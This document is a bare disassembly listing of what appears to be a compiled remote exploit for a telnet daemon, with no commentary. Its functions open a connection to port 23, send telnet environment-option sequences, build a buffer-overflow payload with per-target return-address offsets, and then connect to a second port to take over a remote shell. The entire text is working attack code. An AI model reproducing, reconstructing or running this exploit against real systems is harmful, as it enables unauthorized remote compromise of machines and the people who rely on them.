push   ebp
mov    ebp,esp
sub    esp,0x8
call   80489d4 <call_gmon_start>
nop
call   8048a70 <frame_dummy>
call   804a440 <__do_global_ctors_aux>
leave  
ret    
push   DWORD PTR ds:0x804be40
jmp    DWORD PTR ds:0x804be44
add    BYTE PTR [eax],al
jmp    DWORD PTR ds:0x804be48
push   0x0
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804be4c
push   0x8
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804be50
push   0x10
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804be54
push   0x18
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804be58
push   0x20
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804be5c
push   0x28
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804be60
push   0x30
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804be64
push   0x38
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804be68
push   0x40
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804be6c
push   0x48
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804be70
push   0x50
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804be74
push   0x58
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804be78
push   0x60
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804be7c
push   0x68
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804be80
push   0x70
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804be84
push   0x78
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804be88
push   0x80
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804be8c
push   0x88
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804be90
push   0x90
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804be94
push   0x98
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804be98
push   0xa0
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804be9c
push   0xa8
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804bea0
push   0xb0
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804bea4
push   0xb8
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804bea8
push   0xc0
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804beac
push   0xc8
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804beb0
push   0xd0
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804beb4
push   0xd8
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804beb8
push   0xe0
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804bebc
push   0xe8
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804bec0
push   0xf0
jmp    804879c <.plt>
jmp    DWORD PTR ds:0x804bec4
push   0xf8
jmp    804879c <.plt>
xor    ebp,ebp
pop    esi
mov    ecx,esp
and    esp,0xfffffff0
push   eax
push   esp
push   edx
push   0x804a480
push   0x8048784
push   ecx
push   esi
push   0x8048ab0
call   804889c <__libc_start_main@plt>
hlt    
mov    esi,esi
push   ebp
mov    ebp,esp
push   ebx
push   eax
call   80489de <call_gmon_start+0xa>
pop    ebx
add    ebx,0x345e
mov    eax,DWORD PTR [ebx+0x8c]
test   eax,eax
je     80489f1 <call_gmon_start+0x1d>
call   eax
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
mov    esi,esi
nop
nop
nop
nop
nop
nop
nop
nop
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    edx,DWORD PTR ds:0x804bbac
test   edx,edx
jne    8048a59 <__do_global_dtors_aux+0x59>
mov    edx,DWORD PTR ds:0x804bba8
mov    eax,DWORD PTR [edx]
test   eax,eax
je     8048a36 <__do_global_dtors_aux+0x36>
lea    esi,[esi+eiz*1+0x0]
lea    eax,[edx+0x4]
mov    ds:0x804bba8,eax
call   DWORD PTR [edx]
mov    edx,DWORD PTR ds:0x804bba8
mov    ecx,DWORD PTR [edx]
test   ecx,ecx
jne    8048a20 <__do_global_dtors_aux+0x20>
mov    eax,0x804885c
test   eax,eax
je     8048a4f <__do_global_dtors_aux+0x4f>
sub    esp,0xc
push   0x804bd60
call   804885c <__deregister_frame_info@plt>
add    esp,0x10
mov    eax,0x1
mov    ds:0x804bbac,eax
mov    esp,ebp
pop    ebp
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    esp,ebp
pop    ebp
ret    
lea    esi,[esi+0x0]
push   ebp
mov    eax,0x80487dc
mov    ebp,esp
sub    esp,0x8
test   eax,eax
je     8048a94 <frame_dummy+0x24>
sub    esp,0x8
push   0x804bed4
push   0x804bd60
call   80487dc <__register_frame_info@plt>
add    esp,0x10
mov    esp,ebp
pop    ebp
ret    
nop
lea    esi,[esi+eiz*1+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    esp,ebp
pop    ebp
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
push   esi
push   ebx
sub    esp,0x420
mov    DWORD PTR [ebp-0x10],0x0
sub    esp,0xc
push   0x804a600
call   80488bc <printf@plt>
add    esp,0x10
cmp    DWORD PTR [ebp+0x8],0x1
jne    8048ae8 <main+0x38>
sub    esp,0xc
mov    eax,DWORD PTR [ebp+0xc]
push   DWORD PTR [eax]
call   8049fe4 <usage>
add    esp,0x10
mov    BYTE PTR [ebp-0x418],0x0
nop
sub    esp,0x4
push   0x804a627
push   DWORD PTR [ebp+0xc]
push   DWORD PTR [ebp+0x8]
call   804886c <getopt@plt>
add    esp,0x10
mov    eax,eax
mov    DWORD PTR [ebp-0xc],eax
cmp    DWORD PTR [ebp-0xc],0xffffffff
jne    8048b18 <main+0x68>
jmp    8048bf8 <main+0x148>
mov    esi,esi
mov    eax,DWORD PTR [ebp-0xc]
sub    eax,0x64
mov    DWORD PTR [ebp-0x420],eax
cmp    DWORD PTR [ebp-0x420],0x10
ja     8048be0 <main+0x130>
mov    edx,DWORD PTR [ebp-0x420]
mov    eax,DWORD PTR [edx*4+0x804a6d0]
jmp    eax
sub    esp,0x4
push   0x400
push   DWORD PTR ds:0x804bed0
lea    eax,[ebp-0x418]
push   eax
call   804895c <strncpy@plt>
add    esp,0x10
mov    BYTE PTR [ebp-0x19],0x0
jmp    8048af0 <main+0x40>
nop
sub    esp,0xc
push   DWORD PTR ds:0x804bed0
call   80488fc <atoi@plt>
add    esp,0x10
mov    eax,eax
mov    ds:0x804bc50,eax
jmp    8048af0 <main+0x40>
lea    esi,[esi+0x0]
sub    esp,0x4
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
shl    eax,0x3
add    eax,0x804bbc8
push   eax
push   0x804a631
push   DWORD PTR ds:0x804bed0
call   804890c <sscanf@plt>
add    esp,0x10
jmp    8048af0 <main+0x40>
sub    esp,0xc
push   DWORD PTR ds:0x804bed0
call   80488fc <atoi@plt>
add    esp,0x10
mov    eax,eax
mov    ds:0x804bc58,eax
jmp    8048af0 <main+0x40>
lea    esi,[esi+0x0]
mov    DWORD PTR [ebp-0x10],0x1
jmp    8048af0 <main+0x40>
sub    esp,0xc
mov    eax,DWORD PTR [ebp+0xc]
push   DWORD PTR [eax]
call   8049fe4 <usage>
add    esp,0x10
jmp    8048af0 <main+0x40>
lea    esi,[esi+0x0]
cmp    BYTE PTR [ebp-0x418],0x0
jne    8048c11 <main+0x161>
sub    esp,0xc
mov    eax,DWORD PTR [ebp+0xc]
push   DWORD PTR [eax]
call   8049fe4 <usage>
add    esp,0x10
cmp    DWORD PTR [ebp-0x10],0x0
jne    8048cd8 <main+0x228>
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
lea    edx,[eax*8+0x0]
mov    eax,0x804bbcc
cmp    DWORD PTR [edx+eax*1],0x0
jne    8048c58 <main+0x1a8>
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
lea    edx,[eax*8+0x0]
mov    eax,0x804bbcc
mov    DWORD PTR [edx+eax*1],0x640c
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
shl    eax,0x3
lea    edx,[eax+0x10]
mov    eax,0x804bbc0
cmp    DWORD PTR [edx+eax*1],0x0
jne    8048c93 <main+0x1e3>
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
shl    eax,0x3
lea    edx,[eax+0x10]
mov    eax,0x804bbc0
mov    DWORD PTR [edx+eax*1],0x70bc
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
shl    eax,0x3
lea    edx,[eax+0x10]
mov    eax,0x804bbc4
cmp    DWORD PTR [edx+eax*1],0x0
jne    8048d8b <main+0x2db>
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
shl    eax,0x3
lea    edx,[eax+0x10]
mov    eax,0x804bbc4
mov    DWORD PTR [edx+eax*1],0xcb0
jmp    8048d8b <main+0x2db>
nop
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
lea    edx,[eax*8+0x0]
mov    eax,0x804bbcc
cmp    DWORD PTR [edx+eax*1],0x0
jne    8048d15 <main+0x265>
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
lea    edx,[eax*8+0x0]
mov    eax,0x804bbcc
mov    DWORD PTR [edx+eax*1],0x5394
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
shl    eax,0x3
lea    edx,[eax+0x10]
mov    eax,0x804bbc0
cmp    DWORD PTR [edx+eax*1],0x0
jne    8048d50 <main+0x2a0>
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
shl    eax,0x3
lea    edx,[eax+0x10]
mov    eax,0x804bbc0
mov    DWORD PTR [edx+eax*1],0x7044
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
shl    eax,0x3
lea    edx,[eax+0x10]
mov    eax,0x804bbc4
cmp    DWORD PTR [edx+eax*1],0x0
jne    8048d8b <main+0x2db>
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
shl    eax,0x3
lea    edx,[eax+0x10]
mov    eax,0x804bbc4
mov    DWORD PTR [edx+eax*1],0xc38
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
lea    esi,[eax*8+0x0]
mov    ebx,0x804bbcc
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
lea    ecx,[eax*8+0x0]
mov    edx,0x804bbcc
mov    eax,ds:0x804bc58
add    eax,DWORD PTR [ecx+edx*1]
mov    DWORD PTR [esi+ebx*1],eax
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
shl    eax,0x3
lea    esi,[eax+0x10]
mov    ebx,0x804bbc0
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
shl    eax,0x3
lea    ecx,[eax+0x10]
mov    edx,0x804bbc0
mov    eax,ds:0x804bc58
add    eax,DWORD PTR [ecx+edx*1]
mov    DWORD PTR [esi+ebx*1],eax
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
shl    eax,0x3
lea    esi,[eax+0x10]
mov    ebx,0x804bbc4
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
shl    eax,0x3
lea    ecx,[eax+0x10]
mov    edx,0x804bbc4
mov    eax,ds:0x804bc58
add    eax,DWORD PTR [ecx+edx*1]
mov    DWORD PTR [esi+ebx*1],eax
cmp    DWORD PTR [ebp-0x10],0x0
jne    8048e4c <main+0x39c>
mov    DWORD PTR ds:0x804beec,0x804bc5c
jmp    8048e56 <main+0x3a6>
mov    esi,esi
mov    DWORD PTR ds:0x804beec,0x804bc62
sub    esp,0x4
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
lea    edx,[eax*8+0x0]
mov    eax,0x804bbc4
push   DWORD PTR [edx+eax*1]
lea    eax,[ebp-0x418]
push   eax
push   0x804a634
call   80488bc <printf@plt>
add    esp,0x10
sub    esp,0x8
lea    eax,[ebp-0x418]
push   eax
push   0x804a660
call   80488bc <printf@plt>
add    esp,0x10
sub    esp,0xc
lea    eax,[ebp-0x418]
push   eax
call   804a084 <__ck_hnam_re>
add    esp,0x10
mov    eax,eax
mov    DWORD PTR [ebp-0x41c],eax
sub    esp,0x8
push   DWORD PTR [ebp-0x41c]
push   0x804a696
call   80488bc <printf@plt>
add    esp,0x10
sub    esp,0x8
push   DWORD PTR [ebp-0x41c]
lea    eax,[ebp-0x418]
push   eax
call   804a3c8 <brewtine>
add    esp,0x10
mov    eax,eax
cmp    eax,0xffffffff
jne    8048f10 <main+0x460>
sub    esp,0x8
push   0x804a6a3
push   DWORD PTR ds:0x804becc
call   804881c <fprintf@plt>
add    esp,0x10
sub    esp,0xc
push   0x1
call   80488ec <exit@plt>
mov    esi,esi
lea    esp,[ebp-0x8]
pop    ebx
pop    esi
pop    ebp
ret    
nop
push   ebp
mov    ebp,esp
push   ebx
sub    esp,0xa414
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
shl    eax,0x3
lea    edx,[eax+0x10]
mov    eax,0x804bbc4
push   DWORD PTR [edx+eax*1]
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
shl    eax,0x3
lea    edx,[eax+0x10]
mov    eax,0x804bbc0
push   DWORD PTR [edx+eax*1]
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
lea    edx,[eax*8+0x0]
mov    eax,0x804bbcc
push   DWORD PTR [edx+eax*1]
push   0x804a720
call   80488bc <printf@plt>
add    esp,0x10
sub    esp,0x8
push   DWORD PTR [ebp+0x8]
push   0x804a740
call   80488bc <printf@plt>
add    esp,0x10
sub    esp,0x8
push   0x17
push   DWORD PTR [ebp+0x8]
call   80492a8 <sockami>
add    esp,0x10
mov    eax,eax
mov    DWORD PTR [ebp-0xc],eax
cmp    DWORD PTR [ebp-0xc],0xffffffff
jne    8048fcc <try_this_time+0xb4>
sub    esp,0x8
push   0x804a756
push   DWORD PTR ds:0x804becc
call   804881c <fprintf@plt>
add    esp,0x10
sub    esp,0xc
push   0x1
call   80488ec <exit@plt>
sub    esp,0xc
push   0x804a76b
call   80488bc <printf@plt>
add    esp,0x10
sub    esp,0xc
push   0x804a778
call   80488bc <printf@plt>
add    esp,0x10
sub    esp,0xc
push   DWORD PTR [ebp-0xc]
call   8049394 <td_init>
add    esp,0x10
sub    esp,0xc
push   0x804a793
call   80488bc <printf@plt>
add    esp,0x10
sub    esp,0xc
push   0x804a79b
call   80488bc <printf@plt>
add    esp,0x10
sub    esp,0xc
push   0x27
push   0xfb
push   0xff
push   0x804a7b2
lea    eax,[ebp-0x418]
push   eax
call   804896c <sprintf@plt>
add    esp,0x20
push   0x0
lea    eax,[ebp-0x418]
sub    esp,0x8
push   eax
call   804887c <strlen@plt>
add    esp,0xc
mov    eax,eax
mov    eax,eax
push   eax
lea    eax,[ebp-0x418]
push   eax
push   DWORD PTR [ebp-0xc]
call   804891c <send@plt>
add    esp,0x10
sub    esp,0x4
push   0x804a7b9
push   0x804a7c1
push   DWORD PTR [ebp-0xc]
call   8049450 <put_env>
add    esp,0x10
sub    esp,0x4
push   0x804a7c6
push   0x804a7ce
push   DWORD PTR [ebp-0xc]
call   8049450 <put_env>
add    esp,0x10
sub    esp,0xc
push   0x804a7d3
call   80488bc <printf@plt>
add    esp,0x10
sub    esp,0x8
push   DWORD PTR [ebp+0xc]
push   DWORD PTR [ebp-0xc]
call   80494d8 <__mk_flowa>
add    esp,0x10
sub    esp,0xc
push   0x804a7e0
call   80488bc <printf@plt>
add    esp,0x10
sub    esp,0x4
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
lea    ebx,[eax*8+0x0]
mov    ecx,0x804bbc8
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
shl    eax,0x3
lea    edx,[eax+0x10]
mov    eax,0x804bbc0
mov    eax,DWORD PTR [edx+eax*1]
add    eax,DWORD PTR [ebx+ecx*1]
push   eax
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
lea    edx,[eax*8+0x0]
mov    eax,0x804bbc8
push   DWORD PTR [edx+eax*1]
push   DWORD PTR [ebp-0xc]
call   8049b30 <__mk_darea>
add    esp,0x10
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
lea    ebx,[eax*8+0x0]
mov    ecx,0x804bbc8
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
shl    eax,0x3
lea    edx,[eax+0x10]
mov    eax,0x804bbc0
mov    eax,DWORD PTR [edx+eax*1]
add    eax,DWORD PTR [ebx+ecx*1]
push   eax
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
lea    edx,[eax*8+0x0]
mov    eax,0x804bbc8
push   DWORD PTR [edx+eax*1]
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
shl    eax,0x3
lea    edx,[eax+0x10]
mov    eax,0x804bbc4
push   DWORD PTR [edx+eax*1]
push   0x804a820
call   80488bc <printf@plt>
add    esp,0x10
sub    esp,0xc
push   0x804a858
call   80488bc <printf@plt>
add    esp,0x10
sub    esp,0xc
push   0x27
push   0xfb
push   0xff
push   0x804a7b2
lea    eax,[ebp-0x418]
push   eax
call   804896c <sprintf@plt>
add    esp,0x20
push   0x0
lea    eax,[ebp-0x418]
sub    esp,0x8
push   eax
call   804887c <strlen@plt>
add    esp,0xc
mov    eax,eax
mov    eax,eax
push   eax
lea    eax,[ebp-0x418]
push   eax
push   DWORD PTR [ebp-0xc]
call   804891c <send@plt>
add    esp,0x10
sub    esp,0xc
push   DWORD PTR [ebp-0xc]
call   8049e58 <td_postit>
add    esp,0x10
sub    esp,0xc
push   0x804a86d
call   80488bc <printf@plt>
add    esp,0x10
sub    esp,0xc
push   0x804a880
call   80488bc <printf@plt>
add    esp,0x10
sub    esp,0x4
push   0xa000
lea    eax,[ebp-0xa418]
push   eax
push   DWORD PTR [ebp-0xc]
call   804898c <read@plt>
add    esp,0x10
sub    esp,0xc
push   0x3
call   804888c <sleep@plt>
add    esp,0x10
sub    esp,0xc
push   DWORD PTR [ebp-0xc]
call   80487fc <close@plt>
add    esp,0x10
sub    esp,0xc
push   0x2
call   804888c <sleep@plt>
add    esp,0x10
sub    esp,0x8
push   0x7700
push   DWORD PTR [ebp+0x8]
call   80492a8 <sockami>
add    esp,0x10
mov    eax,eax
mov    DWORD PTR [ebp-0xc],eax
cmp    DWORD PTR [ebp-0xc],0xffffffff
jne    8049294 <try_this_time+0x37c>
mov    eax,0xffffffff
jmp    80492a2 <try_this_time+0x38a>
nop
sub    esp,0xc
push   DWORD PTR [ebp-0xc]
call   8049990 <shellami>
add    esp,0x10
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
nop
push   ebp
mov    ebp,esp
sub    esp,0x28
sub    esp,0x4
push   0x0
push   0x1
push   0x2
call   804897c <socket@plt>
add    esp,0x10
mov    eax,eax
mov    DWORD PTR [ebp-0x20],eax
cmp    DWORD PTR [ebp-0x20],0xffffffff
jne    80492e4 <sockami+0x3c>
sub    esp,0xc
push   0x804a8b5
call   804880c <perror@plt>
add    esp,0x10
sub    esp,0xc
push   0xffffffff
call   80488ec <exit@plt>
sub    esp,0xc
push   DWORD PTR [ebp+0x8]
call   80488dc <gethostbyname@plt>
add    esp,0x10
mov    eax,eax
mov    DWORD PTR [ebp-0x1c],eax
cmp    DWORD PTR [ebp-0x1c],0x0
jne    8049318 <sockami+0x70>
sub    esp,0xc
push   0x804a8be
call   804880c <perror@plt>
add    esp,0x10
sub    esp,0xc
push   0xffffffff
call   80488ec <exit@plt>
nop
sub    esp,0x4
push   0x10
push   0x0
lea    eax,[ebp-0x18]
push   eax
call   804893c <memset@plt>
add    esp,0x10
sub    esp,0x4
mov    eax,DWORD PTR [ebp-0x1c]
push   DWORD PTR [eax+0xc]
mov    eax,DWORD PTR [ebp-0x1c]
mov    eax,DWORD PTR [eax+0x10]
push   DWORD PTR [eax]
lea    eax,[ebp-0x18]
add    eax,0x4
push   eax
call   80488cc <memcpy@plt>
add    esp,0x10
mov    WORD PTR [ebp-0x18],0x2
movzx  eax,WORD PTR [ebp+0xc]
sub    esp,0xc
push   eax
call   804892c <htons@plt>
add    esp,0x10
mov    eax,eax
mov    eax,eax
mov    WORD PTR [ebp-0x16],ax
sub    esp,0x4
push   0x10
lea    eax,[ebp-0x18]
push   eax
push   DWORD PTR [ebp-0x20]
call   804894c <connect@plt>
add    esp,0x10
mov    eax,eax
cmp    eax,0xffffffff
jne    804938c <sockami+0xe4>
mov    eax,0xffffffff
jmp    8049391 <sockami+0xe9>
nop
mov    eax,DWORD PTR [ebp-0x20]
mov    eax,eax
leave  
ret    
nop
push   ebp
mov    ebp,esp
sub    esp,0x418
mov    DWORD PTR [ebp-0x40c],0x0
mov    DWORD PTR [ebp-0x410],0x0
sub    esp,0xc
push   0x5
push   0xfd
push   0xff
push   0x804a7b2
lea    eax,[ebp-0x408]
push   eax
call   804896c <sprintf@plt>
add    esp,0x20
push   0x0
lea    eax,[ebp-0x408]
sub    esp,0x8
push   eax
call   804887c <strlen@plt>
add    esp,0xc
mov    eax,eax
mov    eax,eax
push   eax
lea    eax,[ebp-0x408]
push   eax
push   DWORD PTR [ebp+0x8]
call   804891c <send@plt>
add    esp,0x10
sub    esp,0xc
push   0x1
push   0xfb
push   0xff
push   0x804a7b2
lea    eax,[ebp-0x408]
push   eax
call   804896c <sprintf@plt>
add    esp,0x20
push   0x0
lea    eax,[ebp-0x408]
sub    esp,0x8
push   eax
call   804887c <strlen@plt>
add    esp,0xc
mov    eax,eax
mov    eax,eax
push   eax
lea    eax,[ebp-0x408]
push   eax
push   DWORD PTR [ebp+0x8]
call   804891c <send@plt>
add    esp,0x10
leave  
ret    
nop
push   ebp
mov    ebp,esp
sub    esp,0x418
mov    DWORD PTR [ebp-0x40c],0x0
mov    DWORD PTR [ebp-0x410],0x0
sub    esp,0x4
push   0x400
push   0x0
lea    eax,[ebp-0x408]
push   eax
call   804893c <memset@plt>
add    esp,0x10
push   0xf0
push   0xff
push   DWORD PTR [ebp+0x10]
push   0x1
push   DWORD PTR [ebp+0xc]
push   0x0
push   0x0
push   0x27
push   0xfa
push   0xff
push   0x804a8ce
lea    eax,[ebp-0x408]
push   eax
call   804896c <sprintf@plt>
add    esp,0x30
sub    esp,0x4
push   0x200
lea    eax,[ebp-0x408]
push   eax
push   DWORD PTR [ebp+0x8]
call   80487ec <write@plt>
add    esp,0x10
leave  
ret    
push   ebp
mov    ebp,esp
sub    esp,0xc028
sub    esp,0x8
push   0x804a8e3
push   DWORD PTR [ebp+0x8]
call   80487cc <fdopen@plt>
add    esp,0x10
mov    eax,eax
mov    DWORD PTR [ebp-0xc024],eax
mov    eax,ds:0x804beec
mov    DWORD PTR [ebp-0xc020],eax
sub    esp,0xc
push   DWORD PTR [ebp+0xc]
call   8049804 <calc_rewtn0>
add    esp,0x10
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
lea    edx,[eax*8+0x0]
mov    eax,0x804bbcc
mov    eax,DWORD PTR [edx+eax*1]
mov    ds:0x804bf00,eax
sub    esp,0xc
push   DWORD PTR [ebp+0x8]
call   8049e18 <cl3anuppa>
add    esp,0x10
sub    esp,0xc
push   DWORD PTR [ebp-0xc024]
call   804882c <fflush@plt>
add    esp,0x10
sub    esp,0xc
push   0x186a0
call   80487ac <usleep@plt>
add    esp,0x10
sub    esp,0x4
push   0xa000
lea    eax,[ebp-0xa018]
push   eax
push   DWORD PTR [ebp+0x8]
call   804898c <read@plt>
add    esp,0x10
mov    esi,esi
sub    esp,0xc
push   0x804a8e6
call   80488bc <printf@plt>
add    esp,0x10
call   804987c <calc_rewtn1>
sub    esp,0x4
push   DWORD PTR ds:0x804bef4
push   DWORD PTR ds:0x804bef0
push   0x804a920
call   80488bc <printf@plt>
add    esp,0x10
sub    esp,0x8
mov    eax,DWORD PTR [ebp-0xc020]
movsx  eax,BYTE PTR [eax]
push   eax
push   0x804a94f
call   80488bc <printf@plt>
add    esp,0x10
push   0xf6
push   0xff
push   0x804a969
lea    eax,[ebp-0xc01c]
push   eax
call   804896c <sprintf@plt>
add    esp,0x10
sub    esp,0x4
push   0x1000
push   0x0
lea    eax,[ebp-0xb018]
push   eax
call   804893c <memset@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0xc],0x0
lea    esi,[esi+0x0]
mov    eax,DWORD PTR [ebp-0xc]
cmp    eax,DWORD PTR ds:0x804bef0
jl     804961c <__mk_flowa+0x144>
jmp    804963c <__mk_flowa+0x164>
lea    esi,[esi+0x0]
sub    esp,0x8
lea    eax,[ebp-0xc01c]
push   eax
lea    eax,[ebp-0xb018]
push   eax
call   80488ac <strcat@plt>
add    esp,0x10
lea    eax,[ebp-0xc]
inc    DWORD PTR [eax]
jmp    804960c <__mk_flowa+0x134>
sub    esp,0x8
lea    eax,[ebp-0xb018]
push   eax
lea    eax,[ebp-0xc018]
push   eax
call   804899c <strcpy@plt>
add    esp,0x10
sub    esp,0xc
mov    eax,DWORD PTR [ebp-0xc020]
movsx  eax,BYTE PTR [eax]
push   eax
push   0xfd
push   0xff
push   0x804a7b2
lea    eax,[ebp-0xc01c]
push   eax
call   804896c <sprintf@plt>
add    esp,0x20
sub    esp,0x4
push   0x1000
push   0x0
lea    eax,[ebp-0xb018]
push   eax
call   804893c <memset@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0xc],0x0
mov    eax,DWORD PTR [ebp-0xc]
cmp    eax,DWORD PTR ds:0x804bef4
jl     80496b0 <__mk_flowa+0x1d8>
jmp    80496d0 <__mk_flowa+0x1f8>
lea    esi,[esi+0x0]
sub    esp,0x8
lea    eax,[ebp-0xc01c]
push   eax
lea    eax,[ebp-0xb018]
push   eax
call   80488ac <strcat@plt>
add    esp,0x10
lea    eax,[ebp-0xc]
inc    DWORD PTR [eax]
jmp    80496a0 <__mk_flowa+0x1c8>
sub    esp,0x8
lea    eax,[ebp-0xb018]
push   eax
lea    eax,[ebp-0xc018]
push   eax
call   80488ac <strcat@plt>
add    esp,0x10
sub    esp,0x8
lea    eax,[ebp-0xc018]
push   eax
lea    eax,[ebp-0xb018]
push   eax
call   804899c <strcpy@plt>
add    esp,0x10
push   0x0
lea    eax,[ebp-0xb018]
sub    esp,0x8
push   eax
call   804887c <strlen@plt>
add    esp,0xc
mov    eax,eax
mov    eax,eax
push   eax
lea    eax,[ebp-0xb018]
push   eax
push   DWORD PTR [ebp+0x8]
call   804891c <send@plt>
add    esp,0x10
sub    esp,0xc
push   DWORD PTR [ebp+0x8]
call   8049e18 <cl3anuppa>
add    esp,0x10
sub    esp,0xc
push   DWORD PTR [ebp-0xc024]
call   804882c <fflush@plt>
add    esp,0x10
sub    esp,0xc
push   0x186a0
call   80487ac <usleep@plt>
add    esp,0x10
sub    esp,0x4
push   0xa000
lea    eax,[ebp-0xa018]
push   eax
push   DWORD PTR [ebp+0x8]
call   804898c <read@plt>
add    esp,0x10
sub    esp,0xc
push   0x804a7d3
call   80488bc <printf@plt>
add    esp,0x10
mov    eax,DWORD PTR [ebp-0xc020]
cmp    BYTE PTR [eax],0xcc
jne    8049798 <__mk_flowa+0x2c0>
add    DWORD PTR ds:0x804bf00,0x9
mov    eax,DWORD PTR [ebp-0xc020]
cmp    BYTE PTR [eax],0x10
jne    80497aa <__mk_flowa+0x2d2>
sub    DWORD PTR ds:0x804bf00,0x2
mov    eax,DWORD PTR [ebp-0xc020]
cmp    BYTE PTR [eax],0x69
jne    80497bb <__mk_flowa+0x2e3>
dec    DWORD PTR ds:0x804bf00
mov    eax,DWORD PTR [ebp-0xc020]
cmp    BYTE PTR [eax],0x68
je     80497d4 <__mk_flowa+0x2fc>
mov    eax,DWORD PTR [ebp-0xc020]
cmp    BYTE PTR [eax],0x78
je     80497d4 <__mk_flowa+0x2fc>
jmp    80497db <__mk_flowa+0x303>
nop
sub    DWORD PTR ds:0x804bf00,0x2
lea    eax,[ebp-0xc020]
inc    DWORD PTR [eax]
sub    esp,0xc
push   0x2
call   804888c <sleep@plt>
add    esp,0x10
mov    eax,DWORD PTR [ebp-0xc020]
cmp    BYTE PTR [eax],0x0
jne    8049580 <__mk_flowa+0xa8>
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x208
mov    DWORD PTR ds:0x804bef0,0x0
mov    DWORD PTR ds:0x804bef4,0x0
sub    esp,0x4
push   0x200
push   0x0
lea    eax,[ebp-0x208]
push   eax
call   804893c <memset@plt>
add    esp,0x10
sub    esp,0x4
push   DWORD PTR [ebp+0x8]
push   0x804a96e
lea    eax,[ebp-0x208]
push   eax
call   804896c <sprintf@plt>
add    esp,0x10
lea    eax,[ebp-0x208]
sub    esp,0xc
push   eax
call   804887c <strlen@plt>
add    esp,0x10
mov    eax,eax
mov    ds:0x804bef8,eax
mov    DWORD PTR ds:0x804befc,0x3
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
